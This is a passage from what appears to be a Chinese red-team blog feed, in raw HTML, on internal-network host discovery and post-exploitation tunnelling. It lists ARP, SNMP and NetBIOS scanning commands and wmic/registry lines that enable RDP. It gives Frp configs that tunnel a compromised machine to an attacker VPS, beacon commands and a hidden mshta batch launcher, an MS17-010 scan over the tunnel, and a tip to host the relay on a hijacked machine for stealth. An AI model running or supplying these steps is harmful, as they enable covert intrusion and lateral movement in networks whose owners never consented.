<span class="hljs-keyword">to</span> wait <span class="hljs-keyword">for</span> <span class="hljs-built_in">new</span> datamsf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">set</span> RHOSTS <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>RHOSTS =&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>msf auxiliary(arp_sweep) &gt; <span class="hljs-keyword">set</span> THREADS <span class="hljs-number">10</span></code></pre><p><strong>3、netdiscover</strong></p><pre><code class="hljs dns">$ netdiscover -r <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span> -i wlan0</code></pre><p><strong>4、arp-scan（linux）</strong><br>(推荐)速度与快捷 项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>linux.die.net<span class="hljs-regexp">/man/</span><span class="hljs-number">1</span>/arp-scan</code></pre><p>arp-scan没有内置kali，需要下载安装</p><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install arp-<span class="hljs-built_in">scan</span></code></pre><p><strong>5、Powershell</strong></p><pre><code class="hljs avrasm"><span class="hljs-symbol">c:</span>\tmp&gt;powershell.exe -exec bypass -Command <span class="hljs-string">&quot;Import-Module .\arpscan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24&quot;</span></code></pre><p><strong>6、arp scannet</strong><br>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sourceforge.net<span class="hljs-regexp">/projects/</span>arpscannet<span class="hljs-regexp">/files/</span>arpscannet<span class="hljs-regexp">/arpscannet 0.4/</span></code></pre><p><strong>7、arp-scan（windows）</strong></p><p>(推荐)速度与快捷</p><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>-scan.exe -t <span class="hljs-number">192.168.1.1</span>/<span class="hljs-number">24</span></code></pre><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/QbsuranAlang/</span>arp-scan-windows-<span class="hljs-regexp">/tree/m</span>aster/arp-scan （非官方）</code></pre><p><strong>8、arp-ping.exe</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">arp</span>-ping.exe <span class="hljs-number">192.168.1.100</span></code></pre><p><strong>9、其他</strong></p><p>如cain的arp发现，一些开源py，pl脚本等，不一一介绍。</p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">13</span>-ji-yu-arp-fa-xian-nei-wang-cun-huo-zhu-ji#<span class="hljs-number">5</span>-powershell</code></pre><hr><h3 id="4-6、基于snmp发现内网存活主机"><a href="#4-6、基于snmp发现内网存活主机" class="headerlink" title="4.6、基于snmp发现内网存活主机"></a>4.6、基于snmp发现内网存活主机</h3><p><strong>SNMP简介：</strong></p><p>SNMP是一种简单网络管理协议，它属于TCP/IP五层协议中的应用层协议，用于网络管理的协议。SNMP主要用于网络设备的管理。SNMP协议主要由两大部分构成：SNMP管理站和SNMP代理。SNMP管理站是一个中心节点，负责收集维护各个SNMP元素的信息，并对这些信息进行处理，最后反馈给网络管理员；而SNMP代理是运行在各个被管理的网络节点之上，负责统计该节点的各项信息，并且负责与SNMP管理站交互，接收并执行管理站的命令，上传各种本地的网络信息。</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs ada">$ nmap -sU <span class="hljs-comment">--script snmp-brute 192.168.1.0/24 -T4</span></code></pre><p><strong>msf扫描：</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/snmp_enum</code></pre><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.mcafee.com<span class="hljs-regexp">/us/</span>downloads<span class="hljs-regexp">/free-tools/</span>snscan.aspx</code></pre><p>依然是一块macafee出品的攻击</p><p><strong>NetCrunch：</strong></p><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.adremsoft.com<span class="hljs-regexp">/demo/</span></code></pre><p>内网安全审计工具，包含了DNS审计，ping扫描，端口，网络服务等<br><strong>snmp for pl扫描：</strong></p><p><strong>项目地址：</strong></p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/dheiland-r7/</span>snmp</code></pre><p><strong>附录：</strong></p><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/aix_version use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/arris_dg950use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/snmp_enum_hp_laserjetuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/brocade_enumhash use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumshares use auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cambium_snmp_loot use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_enumusersuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cisco_config_tftp use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_loginuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp<span class="hljs-regexp">/cisco_upload_file use auxiliary/</span>scanner<span class="hljs-regexp">/snmp/</span>snmp_setuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/netopia_enumuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/ubee_ddw3611 use auxiliary<span class="hljs-regexp">/scanner/</span>snmp/sbg6580_enumuse auxiliary<span class="hljs-regexp">/scanner/</span>snmp/xerox_workcentre_enumusers</code></pre><p><strong>其他内网安全审计工具（snmp）：</strong><br>项目地址：<a href="https://www.solarwinds.com/topics/snmp-scanner">https://www.solarwinds.com/topics/snmp-scanner</a><br>项目地址：<a href="https://www.netscantools.com/nstpro_snmp.html">https://www.netscantools.com/nstpro_snmp.html</a></p><p>参考文章：</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://micro<span class="hljs-number">8</span>.gitbook.io/micro<span class="hljs-number">8</span>/contents-<span class="hljs-number">1</span>/<span class="hljs-number">11</span>-<span class="hljs-number">20</span>/<span class="hljs-number">20</span>-ji-yu-snmp-fa-xian-nei-wang-cun-huo-zhu-ji</code></pre><hr><h3 id="4-7、基于netbios发现內网存活主机"><a href="#4-7、基于netbios发现內网存活主机" class="headerlink" title="4.7、基于netbios发现內网存活主机"></a>4.7、基于netbios发现內网存活主机</h3><p><strong>netbios简介：</strong></p><p>IBM公司开发，主要用于数十台计算机的小型局域网。该协议是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的同一的命令集，作用是为了给局域网提供网络以及其他特殊功能。</p><p>系统可以利用WINS服务、广播及Lmhost文件等多种模式将NetBIOS名-——特指基于NETBIOS协议获得计算机名称——解析为相应IP地址，实现信息通讯，所以在局域网内部使用NetBIOS协议可以方便地实现消息通信及资源的共享</p><p><strong>nmap扫描：</strong></p><pre><code class="hljs ada">$ nmap -sU <span class="hljs-comment">--script nbstat.nse -p137 192.168.1.0/24 -T4</span></code></pre><p><strong>msf扫描：</strong></p><pre><code class="hljs awk">msf &gt; use auxiliary<span class="hljs-regexp">/scanner/</span>netbios/nbname</code></pre><p><strong>nbtscan扫描：</strong></p><p>项目地址：</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.unixwiz.net<span class="hljs-regexp">/tools/</span>nbtscan.html</code></pre><p><strong>Windows:</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">D</span>:\&gt;nbtscan-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">35</span>.exe -m <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span></code></pre><p><strong>Linux：（推荐）</strong></p><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>tar -zxvf ./nbtscan-source<span class="hljs-number">-1.0</span>.<span class="hljs-number">35</span>.tgz（<span class="hljs-number">1.5</span>.<span class="hljs-number">1</span>版本在附录）<span class="hljs-variable">$ </span>make <span class="hljs-variable">$ </span>nbtscan -r <span class="hljs-number">192.168</span>.<span class="hljs-number">1.0</span>/<span class="hljs-number">24</span></code></pre><pre><code class="hljs dns">$ nbtscan -v -s: <span class="hljs-number">192.168.1.0</span>/<span class="hljs-number">24</span></code></pre><p><strong>NetBScanner：</strong></p><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.nirsoft.net<span class="hljs-regexp">/utils/</span>netbios_scanner.html</code></pre><p>附录：<br><strong>nbtscan：</strong></p><pre><code class="hljs sql">NBTscan version 1.5.1. Copyright (C) 1999-2003 Alla Bezroutchko. This is a free software and it comes <span class="hljs-keyword">with</span> absolutely <span class="hljs-keyword">no</span> warranty. You can <span class="hljs-keyword">use</span>,<span class="hljs-keyword">distribute</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">modify</span> it <span class="hljs-keyword">under</span> terms <span class="hljs-keyword">of</span> GNU GPL.<span class="hljs-keyword">Usage</span>:nbtscan [-v] [-d] [-e] [-l] [-t <span class="hljs-keyword">timeout</span>] [-b bandwidth] [-r] [-q] [-s separator] [-m retransmits] (-f filename)|(&lt;scan_range&gt;)    -v verbose output. Print <span class="hljs-keyword">all</span> <span class="hljs-keyword">names</span> receivedfrom <span class="hljs-keyword">each</span> host    -d dump packets. Print whole packet contents.    -e <span class="hljs-keyword">Format</span> <span class="hljs-keyword">output</span> <span class="hljs-keyword">in</span> /etc/<span class="hljs-keyword">hosts</span> format.    -l <span class="hljs-keyword">Format</span> <span class="hljs-keyword">output</span> <span class="hljs-keyword">in</span> lmhosts format.Cannot be used <span class="hljs-keyword">with</span> -v, -s <span class="hljs-keyword">or</span> -h options.    -t <span class="hljs-keyword">timeout</span> <span class="hljs-keyword">wait</span> <span class="hljs-keyword">timeout</span> milliseconds <span class="hljs-keyword">for</span> response.Default <span class="hljs-number">1000.</span>    -b bandwidth <span class="hljs-keyword">Output</span> throttling. Slow down <span class="hljs-keyword">output</span> so that it uses <span class="hljs-keyword">no</span> more that bandwidth bps. Useful <span class="hljs-keyword">on</span> slow links, so that ougoing queries don<span class="hljs-string">&#x27;t get dropped.</span><span class="hljs-string">    -r use local port 137 for scans. Win95 boxes respond to this only.You need to be root to use this option on Unix.</span><span class="hljs-string">    -q Suppress banners and error messages,</span><span class="hljs-string">    -s separator Script-friendly output. Don&#x27;</span>t print <span class="hljs-keyword">column</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">record</span> headers, separate <span class="hljs-keyword">fields</span> <span class="hljs-keyword">with</span> separator.    -h Print human-readable <span class="hljs-keyword">names</span> <span class="hljs-keyword">for</span> services. Can <span class="hljs-keyword">only</span> be used <span class="hljs-keyword">with</span> -v option.    -m retransmits <span class="hljs-built_in">Number</span> <span class="hljs-keyword">of</span> retransmits. <span class="hljs-keyword">Default</span> <span class="hljs-number">0.</span>    -f filename Take IP addresses <span class="hljs-keyword">to</span> <span class="hljs-keyword">scan</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">file</span> filename.    -f - makes nbtscan take IP addresses <span class="hljs-keyword">from</span> stdin.    &lt;scan_range&gt; what <span class="hljs-keyword">to</span> scan. Can either be single IP         <span class="hljs-keyword">like</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-keyword">or</span>        <span class="hljs-keyword">range</span> <span class="hljs-keyword">of</span> addresses <span class="hljs-keyword">in</span> one <span class="hljs-keyword">of</span> two forms:        xxx.xxx.xxx.xxx/xx <span class="hljs-keyword">or</span> xxx.xxx.xxx.xxx-xxx.Examples:    nbtscan -r <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>        Scans the whole C-<span class="hljs-keyword">class</span> network.    nbtscan <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span><span class="hljs-number">-137</span>        Scans a <span class="hljs-keyword">range</span> <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span> <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.137</span>    nbtscan -v -s : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>        Scans C-<span class="hljs-keyword">class</span> network. Prints results <span class="hljs-keyword">in</span> script-friendly        <span class="hljs-keyword">format</span> <span class="hljs-keyword">using</span> colon <span class="hljs-keyword">as</span> <span class="hljs-keyword">field</span> separator.          Produces <span class="hljs-keyword">output</span> <span class="hljs-keyword">like</span> that:        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:NT_SERVER:<span class="hljs-number">00</span>U        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:MY_DOMAIN:<span class="hljs-number">00</span>G        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:ADMINISTRATOR:<span class="hljs-number">03</span>U        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>:OTHER_BOX:<span class="hljs-number">00</span>U        ...    nbtscan -f iplist        Scans IP addresses specified <span class="hljs-keyword">in</span> <span class="hljs-keyword">file</span> iplist.</code></pre><p><strong>NBTscan version 1.5.1:</strong></p><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/scallywag/</span>nbtscan</code></pre><hr><h3 id="4-8、内网信息收集之内网代理"><a href="#4-8、内网信息收集之内网代理" class="headerlink" title="4.8、内网信息收集之内网代理"></a>4.8、内网信息收集之内网代理</h3><p><strong>查询代理配置情况</strong></p><pre><code class="hljs taggerscript">reg query &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings&quot;</code></pre><p><strong>查询并开启远程连接服务</strong><br>查看远程连接端口</p><pre><code class="hljs taggerscript">Reg query &quot;hkey_local_machine<span class="hljs-symbol">\s</span>ystem<span class="hljs-symbol">\c</span>urrentcontrolset<span class="hljs-symbol">\c</span>ontrol<span class="hljs-symbol">\t</span>erminal server<span class="hljs-symbol">\w</span>instations<span class="hljs-symbol">\R</span>DP-Tcp&quot; /v portnumber</code></pre><p>在Windows Server 2003中开启3389端口</p><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS !=&quot;&quot;)  <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span></code></pre><p>在Windows Server 2008和Windows Server 2012中开启3389端口</p><pre><code class="hljs taggerscript">wmic /namespace:<span class="hljs-symbol">\\</span>root<span class="hljs-symbol">\c</span>imv2<span class="hljs-symbol">\t</span>erminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:<span class="hljs-symbol">\\</span>root<span class="hljs-symbol">\c</span>imv2<span class="hljs-symbol">\t</span>erminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1reg add &quot;HKLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>URRENT<span class="hljs-symbol">\C</span>ONTROLSET<span class="hljs-symbol">\C</span>ONTROL<span class="hljs-symbol">\T</span>ERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;五、内部信息收集&quot;&gt;&lt;a href=&quot;#五、内部信息收集&quot; class=&quot;headerlink&quot; title=&quot;五、内部信息收集&quot;&gt;&lt;/a&gt;五、内部信息收集&lt;/h1&gt;&lt;h2 id=&quot;1、本地信息搜集&quot;&gt;&lt;a href=&quot;#1、本地信息搜集&quot; class=&quot;head</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>红队攻防学习之穿透与转发</title>
    <link href="http://www.secice.cn/p/2197435e"/>
    <id>http://www.secice.cn/p/2197435e</id>
    <published>2020-12-22T03:22:26.000Z</published>
    <updated>2020-12-28T09:46:50.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id="四、穿透与转发"><a href="#四、穿透与转发" class="headerlink" title="四、穿透与转发"></a>四、穿透与转发</h1><h2 id="1、Frp内网穿透实战"><a href="#1、Frp内网穿透实战" class="headerlink" title="1、Frp内网穿透实战"></a>1、Frp内网穿透实战</h2><p>可以使用参数版frp</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>实战中，当通过某种方式拿下测试虚拟机权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。</p><p>更多详细使用方法，可查看官方Github，这里不再赘述。</p><ul><li><a href="https://github.com/fatedier/frp/">https://github.com/fatedier/frp/</a></li></ul><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a><strong>前期准备</strong></h3><p>先准备一台VPS与域名。</p><p>因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。</p><h3 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a><strong>下载地址</strong></h3><p>Frp下载地址 [跨平台，实战中根据目标机版本选择下载]</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/fatedier/</span>frp/releases</code></pre><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a><strong>配置文件</strong></h3><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><pre><code class="hljs ini"><span class="hljs-comment">#通用配置段</span><span class="hljs-section">[common]</span><span class="hljs-comment">#frp服务端监听 [VPS]</span><span class="hljs-attr">bind_addr</span> = <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span><span class="hljs-comment">#frp服务器监听端口 [实战中可以用一些通透性较好的端口]</span><span class="hljs-attr">bind_port</span> = <span class="hljs-number">7007</span><span class="hljs-comment">#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]</span><span class="hljs-attr">dashboard_port</span> = <span class="hljs-number">6609</span><span class="hljs-comment">#服务端Web控制面板用户名与密码 [强口令]</span><span class="hljs-attr">dashboard_user</span> = SuperMan<span class="hljs-attr">dashboard_pwd</span> = WC3pvjmh2tt8<span class="hljs-comment">#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中</span><span class="hljs-attr">log_file</span> = ./frps.log<span class="hljs-comment">#日志记录等级，有trace、debug、info、warn、error,通常情况下为info</span><span class="hljs-attr">log_level</span> = info<span class="hljs-comment">#日志保留时间</span><span class="hljs-attr">log_max_days</span> = <span class="hljs-number">3</span><span class="hljs-comment">#验证凭据，服务端和客户端的凭据必须一样才能连接</span><span class="hljs-attr">auth_token</span> = E0iQEBOdoJeh<span class="hljs-comment">#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端]</span><span class="hljs-attr">privilege_mode</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#特权模式Token [强口令，建议随机生成]</span><span class="hljs-attr">privilege_token</span> = kukezkHC8R1H<span class="hljs-comment">#特权模式允许分配的端口 [避免端口被滥用]</span><span class="hljs-attr">privilege_allow_ports</span> = <span class="hljs-number">4000</span>-<span class="hljs-number">50000</span><span class="hljs-comment">#心跳检测超时时长</span><span class="hljs-attr">heartbeat_timeout</span> = <span class="hljs-number">30</span><span class="hljs-comment">#每个代理可以设置的连接池上限</span><span class="hljs-attr">max_pool_count</span> = <span class="hljs-number">20</span><span class="hljs-comment">#口令认证超时时间，一般不用改</span><span class="hljs-attr">authentication_timeout</span> = <span class="hljs-number">900</span><span class="hljs-comment">#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析]</span><span class="hljs-attr">subdomain_host</span> = xxxx.<span class="hljs-literal">on</span>line</code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><pre><code class="hljs ini"><span class="hljs-comment">#通用配置段</span><span class="hljs-section">[common]</span><span class="hljs-comment">#frp服务端IP或域名 [实战中一般都会直接用域名]</span><span class="hljs-attr">server_addr</span> = frp.xxxx.<span class="hljs-literal">on</span>line<span class="hljs-comment">#frp服务器端口</span><span class="hljs-attr">server_port</span> = <span class="hljs-number">7007</span><span class="hljs-comment">#授权token，此处必须与服务端保持一致，否则无法建立连接</span><span class="hljs-attr">auth_token</span> = E0iQEBOdoJeh<span class="hljs-comment">#启用特权模式 [特权模式下服务端无需配置]</span><span class="hljs-attr">privilege_mode</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#特权模式 token,同样要与服务端完全保持一致</span><span class="hljs-attr">privilege_token</span> = kukezkHC8R1H<span class="hljs-comment">#心跳检查间隔与超时时间</span><span class="hljs-attr">heartbeat_interval</span> = <span class="hljs-number">10</span><span class="hljs-attr">heartbeat_timeout</span> = <span class="hljs-number">30</span><span class="hljs-comment">#启用加密 [通信内容加密传输，有效防止流量被拦截]</span><span class="hljs-attr">use_encryption</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]</span><span class="hljs-attr">use_compression</span> = <span class="hljs-literal">true</span><span class="hljs-comment">#连接数量</span><span class="hljs-attr">pool_count</span> = <span class="hljs-number">20</span><span class="hljs-comment">#内网穿透通常用socks5</span><span class="hljs-section">[socks5]</span><span class="hljs-attr">type</span> = tcp<span class="hljs-comment">#连接VPS内网穿透的远程连接端口</span><span class="hljs-attr">remote_port</span> = <span class="hljs-number">9066</span><span class="hljs-comment">#使用插件socks5代理</span><span class="hljs-attr">plugin</span> = socks5<span class="hljs-comment">#socks5连接口令 [根据实际情况进行配置]</span><span class="hljs-comment">#plugin_user = SuperMan</span><span class="hljs-comment">#plugin_passwd = ZBO0McQe6mE1</span></code></pre><h3 id="执行部署"><a href="#执行部署" class="headerlink" title="执行部署"></a><strong>执行部署</strong></h3><h4 id="服务端-1"><a href="#服务端-1" class="headerlink" title="服务端"></a><strong>服务端</strong></h4><p>SSH连接到VPS上，后台启动frp服务端。</p><pre><code class="hljs bash">root@Ubuntu:~<span class="hljs-comment"># cd tools/frp/</span>root@Ubuntu:~/tools/frp<span class="hljs-comment"># nohup ./frps -c frps.ini &amp;</span>root@Ubuntu:~/tools/frp<span class="hljs-comment"># jobs -l</span>root@Ubuntu:~/tools/frp<span class="hljs-comment"># cat frps.log</span></code></pre><h4 id="客户端-1"><a href="#客户端-1" class="headerlink" title="客户端"></a><strong>客户端</strong></h4><p>将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。</p><p>当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到</p><p>但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序</p><pre><code class="hljs smali">beacon&gt; sleep 10beacon&gt;<span class="hljs-built_in"> execute </span>c:/frpc.exe -c c:/frpc.inibeacon&gt; shell netstat -ano |findstr 7007</code></pre><p>或者，创建后台运行的bat脚本。</p><pre><code class="hljs bat">@<span class="hljs-built_in">echo</span> off<span class="hljs-keyword">if</span> &quot;%<span class="hljs-number">1</span>&quot; == &quot;h&quot; <span class="hljs-keyword">goto</span> beginmshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,<span class="hljs-number">0</span>)(window.close)&amp;&amp;<span class="hljs-keyword">exit</span>:begin<span class="hljs-function">c:\<span class="hljs-title">frpc.exe</span> -<span class="hljs-title">c</span> <span class="hljs-title">c</span>:\<span class="hljs-title">frpc.ini</span></span></code></pre><h3 id="工具穿透"><a href="#工具穿透" class="headerlink" title="工具穿透"></a><strong>工具穿透</strong></h3><h4 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h4><p>当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。[若socks5设置口令，可结合proxychains]</p><pre><code class="hljs apache"><span class="hljs-attribute">msf5</span> &gt; setg proxies socks<span class="hljs-number">5</span>:frp.xxxx.online:<span class="hljs-number">9066</span><span class="hljs-attribute">msf5</span> &gt; use auxiliary/scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span><span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; set threads <span class="hljs-number">10</span><span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; set rhosts <span class="hljs-number">192.168.144.178</span><span class="hljs-attribute">msf5</span> auxiliary(scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>) &gt; run</code></pre><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h4><p>Windows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a><strong>小结</strong></h3><p>Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“做菜的肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等</p><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://mp.weixin.qq.com/s?__biz=MzU<span class="hljs-number">1</span>NjgzOTAyMg==&amp;mid=<span class="hljs-number">2247485563</span>&amp;idx=<span class="hljs-number">2</span>&amp;sn=<span class="hljs-number">1163136</span>fa<span class="hljs-number">1</span>e<span class="hljs-number">407</span>bef<span class="hljs-number">053</span>a<span class="hljs-number">7</span>ce<span class="hljs-number">8</span>c<span class="hljs-number">6</span>f<span class="hljs-number">1</span>fb<span class="hljs-number">4</span>&amp;chksm=fc<span class="hljs-number">3</span>fb<span class="hljs-number">17</span>acb<span class="hljs-number">48386</span>c<span class="hljs-number">0</span>d<span class="hljs-number">41802</span>ee<span class="hljs-number">5</span>f<span class="hljs-number">2</span>e<span class="hljs-number">1469</span>d<span class="hljs-number">192422</span>d<span class="hljs-number">80</span>c<span class="hljs-number">1</span>b<span class="hljs-number">03</span>ed<span class="hljs-number">476</span>beec<span class="hljs-number">419</span>c<span class="hljs-number">43</span>e<span class="hljs-number">06</span>e<span class="hljs-number">341621</span>a<span class="hljs-number">26</span>&amp;scene=<span class="hljs-number">21</span>    ---AnonySec 感谢大佬</code></pre><hr><h2 id="2、基于ported端口转发"><a href="#2、基于ported端口转发" class="headerlink" title="2、基于ported端口转发"></a>2、基于ported端口转发</h2><p>portfwd是一款强大的端口转发工具，支持TCP，UDP，支持IPV4–IPV6的转换转发。并且内置于meterpreter。其中exe单版本源码如下：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rssnsj/</span>portfwd</code></pre><p><strong>攻击机：</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.5</span> Debian</code></pre><p><strong>靶机：</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.1.4</span> Windows <span class="hljs-number">7</span><span class="hljs-number">192.168.1.119</span> Windows <span class="hljs-number">2003</span></code></pre><pre><code class="hljs sql">msf exploit(multi/<span class="hljs-keyword">handler</span>) \&gt; sessions ‐l Active sessions===============<span class="hljs-keyword">Id</span> <span class="hljs-keyword">Name</span> <span class="hljs-keyword">Type</span> Information <span class="hljs-keyword">Connection</span>‐‐ ‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐<span class="hljs-number">1</span> meterpreter x86/windows WIN03X64\Administrator @ WIN03X64 <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.5</span>:<span class="hljs-number">45303</span> ‐&gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>:<span class="hljs-number">53</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.119</span>)msf exploit(multi/<span class="hljs-keyword">handler</span>) &gt; sessions ‐i <span class="hljs-number">1</span> ‐c <span class="hljs-string">&#x27;ipconfig&#x27;</span>[*] Running <span class="hljs-string">&#x27;ipconfig&#x27;</span> <span class="hljs-keyword">on</span> meterpreter <span class="hljs-keyword">session</span> <span class="hljs-number">1</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span 